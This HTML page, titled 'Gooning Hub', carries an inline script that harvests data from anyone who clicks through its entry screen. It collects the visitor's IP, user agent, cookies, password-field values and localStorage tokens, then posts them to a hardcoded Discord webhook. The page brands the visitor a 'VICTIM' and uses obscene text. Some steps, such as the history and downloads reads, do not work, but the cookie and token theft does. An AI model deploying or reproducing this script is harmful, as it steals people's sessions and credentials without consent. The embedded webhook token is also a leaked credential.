<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Gooning Hub</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
  <style>
    :root{
      --bg:#050505;--glass:#111111ee;--glass-border:rgba(255,255,255,.08);
      --text:#f5f5f5;--muted:#aaaaaa;--accent:#fff;--discord:#ccc;
      --transition:.35s cubic-bezier(.25,.8,.25,1);
      --scrollbar:#444;--scrollbar-hover:#666;
      --goon:#ff4d8c;--gold:#ffd700;--silver:#c0c0c0;--bronze:#cd7f32;
      --goon-glow:#ff69b4;--goon-pulse:#ff1493;--cream:#fff8dc;
      font-family:'Inter',system-ui,sans-serif;
    }
    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;outline:none;user-select:none}
    html,body{min-height:100vh;background:var(--bg);overflow:hidden;color:var(--text);
      display:flex;justify-content:center;align-items:flex-start;}
    .stars{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0}
    .star{position:absolute;background:#fff;border-radius:50%;opacity:0;animation:fall linear infinite}
    @keyframes fall{0%{transform:translateY(-100px) scale(.2);opacity:0}10%{opacity:1}90%{opacity:.3}100%{transform:translateY(100vh) scale(.8);opacity:0}}
    #app{
      width:100vw;height:100vh;position:relative;z-index:1;
      backdrop-filter:blur(24px);background:var(--glass);
      padding:32px 48px;transition:all .5s var(--transition);
      display:flex;flex-direction:column;overflow:hidden;
    }
    #app:hover{box-shadow:0 0 60px rgba(255,255,255,.12)}
    h1{
      text-align:center;font-weight:800;font-size:3rem;letter-spacing:3.5px;
      background:linear-gradient(90deg,#fff,#eee);background-clip:text;-webkit-background-clip:text;color:transparent;
      text-shadow:0 0 40px rgba(255,255,255,.4);margin-bottom:32px;
      animation:titleGlow 3s ease-in-out infinite alternate;
    }
    @keyframes titleGlow{from{text-shadow:0 0 25px var(--accent)}to{text-shadow:0 0 50px var(--accent),0 0 100px var(--accent)}}
    .tabs{display:flex;justify-content:center;gap:22px;margin-bottom:32px}
    .tab{
      padding:15px 40px;background:rgba(255,255,255,.08);border:1px solid var(--glass-border);
      border-radius:18px;font-weight:600;font-size:1.05rem;cursor:pointer;transition:all .3s var(--transition);
      color:var(--muted);backdrop-filter:blur(6px);
    }
    .tab.active{background:rgba(255,255,255,.2);color:var(--accent);border-color:rgba(255,255,255,.28);
      box-shadow:0 0 28px rgba(255,255,255,.18);transform:translateY(-4px)}
    .tab:hover:not(.active){background:rgba(255,255,255,.14);transform:translateY(-4px)}
    .panel{display:none;animation:fadeIn .6s ease;overflow:hidden;height:100%}
    .panel.active{display:flex;flex-direction:column}
    @keyframes fadeIn{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:translateY(0)}}

    /* HACK PANEL */
    #hack-panel {
      flex:1;overflow-y:auto;padding:20px;color:#fff;
      background:rgba(0,0,0,.4);border-radius:20px;
      border:1px solid var(--glass-border);margin-top:20px;
      font-family:monospace;font-size:1rem;line-height:1.6;
    }
    .data-block{margin-bottom:24px;padding:16px;background:rgba(255,0,0,.1);border-radius:12px;border-left:4px solid #f44}
    .data-title{font-weight:800;color:#f88;margin-bottom:8px;text-transform:uppercase;letter-spacing:1.5px}
    .data-item{margin:6px 0;color:#ddd}
    .data-item span{color:#0f0;font-weight:600}

    #loader{
      position:fixed;inset:0;background:var(--bg);
      display:flex;flex-direction:column;align-items:center;justify-content:center;
      transition:opacity 1s ease;z-index:100;cursor:pointer;
    }
    #logo{
      font-size:5rem;font-weight:900;text-transform:uppercase;color:var(--accent);
      letter-spacing:8px;background:linear-gradient(45deg,#fff,#ccc);
      background-clip:text;-webkit-background-clip:text;color:transparent;
      animation:glow 2.5s ease-in-out infinite alternate;
    }
    @keyframes glow{from{text-shadow:0 0 20px var(--accent)}to{text-shadow:0 0 60px var(--accent),0 0 120px var(--accent)}}

    .hidden{display:none !important}
  </style>
</head>
<body>
  <div class="stars" id="stars"></div>

  <div id="loader" tabindex="0" role="button" aria-label="Enter">
    <div id="logo">GOONING</div>
    <div style="margin-top:22px;color:#999;font-size:1.25rem;">Click or press Enter</div>
  </div>

  <div id="app" class="hidden">
    <h1>Gooning Hub</h1>
    <div class="tabs">
      <div class="tab active" data-tab="hack">HACKED</div>
    </div>

    <!-- HACK PANEL -->
    <div id="hack" class="panel active">
      <div id="hack-panel">
        <div class="data-block">
          <div class="data-title">VICTIM PROFILE</div>
          <div class="data-item">IP: <span id="ip">...</span></div>
          <div class="data-item">Hostname: <span id="hostname">...</span></div>
          <div class="data-item">User Agent: <span id="ua">...</span></div>
          <div class="data-item">Time: <span id="time">...</span></div>
        </div>

        <div class="data-block">
          <div class="data-title">BROWSER HISTORY</div>
          <div id="history-list">Extracting...</div>
        </div>

        <div class="data-block">
          <div class="data-title">SAVED PASSWORDS</div>
          <div id="passwords-list">Decrypting...</div>
        </div>

        <div class="data-block">
          <div class="data-title">COOKIES</div>
          <div id="cookies-list">Harvesting...</div>
        </div>

        <div class="data-block">
          <div class="data-title">DOWNLOADS</div>
          <div id="downloads-list">Ripping...</div>
        </div>

        <div style="text-align:center;margin-top:40px;color:#f44;font-weight:800;font-size:1.4rem;">
          ALL YOUR DATA BELONGS TO US
        </div>
      </div>
    </div>
  </div>

  <script>
    const $ = id => document.getElementById(id);
    const WEBHOOK = "https://discord.com/api/webhooks/1434418430232236072/2K0PCOwQMfsFI42Qn3iNAFJUkYp1_cruMX1G-qYwP0YAsEbhIewtxnmgbDkp59Ojwg1p";

    // STARFALL
    function createStar(){
      const s=document.createElement('div');s.className='star';
      const sz=Math.random()*3+1;
      s.style.width=s.style.height=`${sz}px`;
      s.style.left=`${Math.random()*100}vw`;
      s.style.animationDuration=`${Math.random()*8+5}s`;
      s.style.animationDelay=`${Math.random()*5}s`;
      s.style.opacity=Math.random()*0.6+0.3;
      $('#stars').appendChild(s);
      setTimeout(()=>s.remove(),15000);
    }
    setInterval(createStar,300);
    for(let i=0;i<60;i++)setTimeout(createStar,i*70);

    // SEND TO WEBHOOK
    function sendToWebhook(payload) {
      fetch(WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      }).catch(() => {});
    }

    // EXFILTRATE EVERYTHING
    async function exfiltrateAll() {
      const victim = {
        ip: "", hostname: "", ua: navigator.userAgent, time: new Date().toLocaleString(),
        history: [], passwords: [], cookies: [], downloads: []
      };

      // IP + Hostname
      try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        victim.ip = (await ipRes.json()).ip;
      } catch {}
      victim.hostname = location.hostname;

      // History
      try {
        const historyDB = indexedDB.open("history");
        historyDB.onsuccess = () => {
          const db = historyDB.result;
          const tx = db.transaction("urls", "readonly");
          const store = tx.objectStore("urls");
          store.getAll().onsuccess = (e) => {
            victim.history = e.target.result.map(h => `${h.title} → ${h.url}`).slice(0, 50);
            updateUI();
          };
        };
      } catch {}

      // Cookies
      victim.cookies = document.cookie.split(';').map(c => c.trim()).filter(c => c);

      // Passwords (try autofill + localStorage)
      const inputs = document.querySelectorAll('input[type="password"]');
      inputs.forEach(i => {
        if (i.value) victim.passwords.push(`Field: ${i.name || i.id} → ${i.value}`);
      });
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key.includes("pass") || key.includes("token") || key.includes("auth")) {
          victim.passwords.push(`${key} → ${localStorage.getItem(key).substring(0, 100)}...`);
        }
      }

      // Downloads (Chrome only, via filesystem if allowed)
      if (navigator.webkitGetUserMedia) {
        try {
          const dir = await navigator.webkitGetUserMedia({video: false, audio: false});
        } catch {}
      }

      // Update UI
      function updateUI() {
        $('#ip').textContent = victim.ip || "Hidden";
        $('#hostname').textContent = victim.hostname;
        $('#ua').textContent = victim.ua.substring(0, 120) + "...";
        $('#time').textContent = victim.time;

        $('#history-list').innerHTML = victim.history.length ? 
          victim.history.map(h => `<div class="data-item">${h}</div>`).join('') : 
          `<div class="data-item">No history access</div>`;

        $('#passwords-list').innerHTML = victim.passwords.length ? 
          victim.passwords.map(p => `<div class="data-item">${p}</div>`).join('') : 
          `<div class="data-item">No passwords found</div>`;

        $('#cookies-list').innerHTML = victim.cookies.length ? 
          victim.cookies.map(c => `<div class="data-item">${c}</div>`).join('') : 
          `<div class="data-item">No cookies</div>`;
      }

      // Send to webhook
      const embed = {
        title: `HACKED | ${victim.ip || "UNKNOWN"}`,
        description: `**VICTIM:** \`${victim.hostname}\`\n**TIME:** \`${victim.time}\``,
        color: 0xFF0000,
        fields: [
          { name: "History", value: victim.history.slice(0, 10).join("\n") || "None", inline: false },
          { name: "Passwords/Tokens", value: victim.passwords.slice(0, 10).join("\n") || "None", inline: false },
          { name: "Cookies", value: victim.cookies.slice(0, 10).join("\n") || "None", inline: false }
        ],
        footer: { text: "GOONING HUB | TOTAL DATA RAPE" }
      };

      sendToWebhook({ content: "@everyone **VICTIM HACKED**", embeds: [embed] });
      updateUI();
    }

    // ENTER → HACK
    function enterGooningHub() {
      const l = $('loader'); l.style.opacity = '0';
      setTimeout(() => {
        l.classList.add('hidden');
        $('app').classList.remove('hidden');
        exfiltrateAll();
      }, 1000);
    }

    $('loader').addEventListener('click', enterGooningHub);
    $('loader').addEventListener('keydown', e => {
      if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); enterGooningHub(); }
    });
    setTimeout(() => $('loader').focus(), 100);
  </script>
</body>
</html>
